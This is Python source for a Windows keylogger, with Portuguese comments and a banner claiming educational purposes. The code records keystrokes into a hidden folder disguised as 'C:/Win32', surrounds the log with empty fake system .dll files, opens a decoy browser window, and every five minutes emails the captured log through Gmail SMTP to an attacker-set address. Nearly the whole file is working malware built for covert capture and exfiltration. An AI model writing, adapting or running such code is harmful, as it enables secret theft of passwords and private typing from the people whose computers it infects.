#========================================================
#|                                                      |
#|  Este projeto existe apenas para fins educacionais   |
#|                                                      |
#========================================================

import keyboard as kb
import datetime
import threading
import os
import ctypes
import time
import smtplib
import webbrowser as wb
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Pegando o nome do usuário do sistema
system_name = os.getenv('USERNAME')

# Criando o path que o arquivo vai ficar
path = "C:/Win32/"
if not os.path.exists(path):
    os.mkdir(path)
ctypes.windll.kernel32.SetFileAttributesW(path, 0x02) # Fazendo com que a pasta fique invisivel
filename = "win32.ini" # Arquivo onde o log ficara armazenado
file = open(f"{path}{filename}", 'a')

# Configs para o email
email_sender = ""                                   # Seu @gmail (ou derivados)
email_key = ""                                      # Chave de acesso para apps menos seguros
email_receiver = ""                                 # Email que vai receber os arquivos
conteudo = "Arquivo de log capturado com python!"   # Mensagem de controle

# Função que retorna a hora atual em string
def get_hour():
    hora = datetime.datetime.now()
    hora = hora.strftime("%m-%d %H:%M:%S")
    hora = str(hora)
    return hora

# Função para abrir algo falso (browser por exemplo)
def fake_app():
    url = "https://"
    wb.open(url)

# Criando arquivos fakes para o win32.ini se camuflar entre eles
def fake_archives():
    ext = '.dll'
    lista_arq = ['win32', 'msvcp140', 'vcruntime140', 'ucrtbase', 'vccorlib140', 'api-ms-win-core-libraryloader-l1-1-0',
                'api-ms-win-core-localization-l1-2-0', 'api-ms-win-core-rtlsupport-l1-1-0', 'api-ms-win-crt-environment-l1-1-0',
                'api-ms-win-crt-string-l1-1-0', 'api-ms-win-core-debug-l1-1-0', 'api-ms-win-core-errorhandling-l1-1-0',
                'api-ms-win-core-file-l1-1-0', 'api-ms-win-core-file-l1-2-0', 'api-ms-win-core-file-l2-1-0',
                'api-ms-win-core-file-l2-1-1', 'api-ms-win-core-file-l2-2-0', 'api-ms-win-core-file-l2-2-1', 'sqmapi', 'nss3',
                'vcruntime140', 'vcruntime140_1', 'vcruntime140_2', 'vfcompat', 'lgpllibs', 'libEGL', 'libGLESv2']
    for arq in lista_arq:
        if not os.path.exists(f"{path}{arq}{ext}"):
            open(f"{path}{arq}{ext}", 'x')

# Função para realizar o envio do email
def send_email():
    # Criando um objeto multi part e atribuindo os valores necessarios como remetente, destinatário e assunto do email
    msg = MIMEMultipart()
    msg['From'] = email_sender
    msg['To'] = email_receiver
    msg['Subject'] = f"Keylogger - {system_name} - {get_hour()}"
    msg.attach(MIMEText(conteudo)) # Anexa o conteudo

    with open(f"{path}{filename}", 'r') as attachment:
        attachment_content = attachment.read() # Abrindo o arquivo em modo leitura

    # MIMEBase é um obj para representar o anexo do email, ('application', 'octet-stream') são dados binários não especificos
    attachment = MIMEBase('application', 'octet-stream') 
    attachment.set_payload(attachment_content)
    encoders.encode_base64(attachment)
    attachment.add_header('Content-Disposition', f'attachment; filename= {filename}') # Garantindo que seja anexo e definindo um nome
    msg.attach(attachment) # Anexando de fato

    try:
        servidor_email = smtplib.SMTP('smtp.gmail.com', 587) # Configurando o servidor, podendo ser qualquer outro tipo de email
        servidor_email.starttls()
        servidor_email.login(email_sender, email_key) # Realizando login com sua própria conta
        servidor_email.sendmail(email_sender, email_receiver, msg.as_string()) # Enviando o email com as informações passadas anteriormente
        servidor_email.quit()
    except Exception as e: # Except para debug
        print(f"Erro ao enviar o email: {e}")

# Timer para o envio do email
def timer():
    global file

    tempo = 0
    while True:
        if tempo < (60 * 5): # Setando o timer para 5 minutos
            tempo += 1
            time.sleep(1)
        else:
            file.close()
            send_email()
            tempo = 0

def main(): 
    global file

    # Thread para o timer rodar ao mesmo tempo que o keylogger
    timer_thread = threading.Thread(target=timer, daemon=True)
    timer_thread.start()

    while True:
        try:
            # Keylogger em si
            key = kb.read_key()
            file = open(f"{path}{filename}", 'a')
            if kb.is_pressed(key):
                
                # Tratando algumas possibilidades para evitar poluição do arquivo (switch case pref)
                if key == "space":
                    txt = ' '
                elif key == "enter":
                    txt = f" - {get_hour()}\n"
                elif key == "shift":
                    txt = ""
                elif key == "ctrl":
                    txt = f"({key})"
                elif key == "tab" or key == "alt":
                    txt = f"[{key}]"
                elif key == "backspace":
                    txt = "<X>"
                elif key == "caps lock":
                    txt = f"[CL]"
                else:
                    txt = key
                # Escrevendo no arquivo
                file.write(txt)
                file.close()

        except Exception as e: # Except para debug
            print(f"Erro: {e}")
            break

if __name__ == "__main__":
    fake_archives()
    fake_app()
    main()